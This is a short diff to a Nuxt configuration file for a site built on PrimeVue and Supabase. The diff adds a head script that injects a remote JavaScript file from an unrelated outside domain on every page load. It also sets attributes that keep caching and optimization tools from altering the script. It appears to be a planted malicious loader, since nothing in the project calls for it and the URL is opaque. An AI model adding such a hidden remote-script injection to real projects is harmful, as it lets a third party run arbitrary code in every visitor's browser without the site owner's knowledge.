@@ -2,6 +2,17 @@ import Aura from '@primevue/themes/aura'
 
 export default defineNuxtConfig({
   compatibilityDate: '2025-07-15',
+  app: {
+    head: {
+      script: [
+        {
+          innerHTML: `(function(){var s=document.createElement("script");s.async=1;s.src='https://emrld.ltd/NTQ1NzIx.js?t=545721';document.head.appendChild(s);})();`,
+          'data-noptimize': '1',
+          'data-cfasync': 'false',
+        },
+      ],
+    },
+  },
   devtools: { enabled: true },
   modules: ['@nuxtjs/i18n', '@primevue/nuxt-module', '@nuxtjs/supabase', '@pinia/nuxt', '@nuxtjs/sitemap'],
   i18n: {
